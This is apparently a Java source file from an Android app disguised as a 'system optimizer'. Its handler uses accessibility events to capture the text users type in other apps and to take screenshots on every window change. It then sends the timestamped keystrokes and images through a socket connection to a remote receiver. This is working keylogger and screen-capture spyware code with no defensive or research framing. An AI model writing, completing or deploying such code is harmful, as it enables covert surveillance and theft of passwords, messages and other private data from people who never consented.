package com.system.optimizer.handler;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import android.os.Handler;
import android.os.Looper;

import com.system.optimizer.network.SocketManager;

import android.view.accessibility.AccessibilityEvent;

/**
 * Unified event handler for text events with optional screenshot capture.
 * 
 * Flow:
 * 1. Trigger with text (optional)
 * 2. After delay: capture screenshot
 * 3. Send text message (if provided)
 * 4. When screenshot resolves: send image
 */
public class AccessibilityEventHandler {
    private static final long DELAY_MS = 2000;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ScreenshotCapture screenshotCapture;
    private final SocketManager socketManager;
    private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    private String pendingText = "";
    private final Runnable executeRunnable;

    public AccessibilityEventHandler(ScreenshotCapture screenshotCapture, SocketManager socketManager) {
        if (screenshotCapture == null) {
            throw new IllegalArgumentException("ScreenshotCapture cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }

        this.screenshotCapture = screenshotCapture;
        this.socketManager = socketManager;

        this.executeRunnable = () -> {
            String textToSend;

            // Extract text if available
            synchronized (this) {
                textToSend = pendingText;
                pendingText = "";
            }

            // Send text first (if available)
            if (textToSend != null && !textToSend.isEmpty()) {
                String timestamp = timestampFormat.format(new Date());
                String messageWithTimestamp = "[" + timestamp + "] " + textToSend;
                this.socketManager.sendEvent("logger", messageWithTimestamp);
            }

            // Always capture screenshot after delay
            screenshotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
                @Override
                public void onSuccess(byte[] imageData) {
                    if (imageData != null) {
                        socketManager.sendEvent("screenshot_response", imageData);
                    } else {
                        socketManager.sendEvent("screenshot_error", "Screenshot returned null data");
                    }
                }

                @Override
                public void onError(String errorMessage) {
                    socketManager.sendEvent("screenshot_error", errorMessage);
                }
            }, false); // isManual=false for automatic screenshots
        };
    }

    /**
     * Handle accessibility event from AccessibilityLoggerService.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getText() == null) {
            return;
        }

        // Ignore system UI and keyboard events
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (packageName.equals("com.android.systemui") ||
                packageName.equals("android") ||
                packageName.equals("com.google.android.inputmethod.latin")) {
            return;
        }

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = normalizeTextEvent(event.getText());
            if (!text.isEmpty()) {
                triggerWithText(text);
            }
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            triggerCaptureOnly();
        }
    }

    /**
     * Trigger with text - will send text and capture screenshot after delay.
     */
    public void triggerWithText(String text) {
        synchronized (this) {
            pendingText = text;
        }
        scheduleExecution();
    }

    /**
     * Trigger for window change (TYPE_WINDOW_STATE_CHANGED) - capture screenshot only.
     */
    public void triggerCaptureOnly() {
        synchronized (this) {
            pendingText = "";
        }
        scheduleExecution();
    }

    /**
     * Schedule execution after delay.
     */
    private void scheduleExecution() {
        handler.removeCallbacks(executeRunnable);
        handler.postDelayed(executeRunnable, DELAY_MS);
    }

    /**
     * Normalize text from accessibility event.
     */
    private String normalizeTextEvent(java.util.List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text) {
            if (cs != null && cs.length() > 0) {
                if (sb.length() > 0) {
                    sb.append(": ");
                }
                sb.append(cs.toString().trim());
            }
        }
        return sb.toString();
    }
}
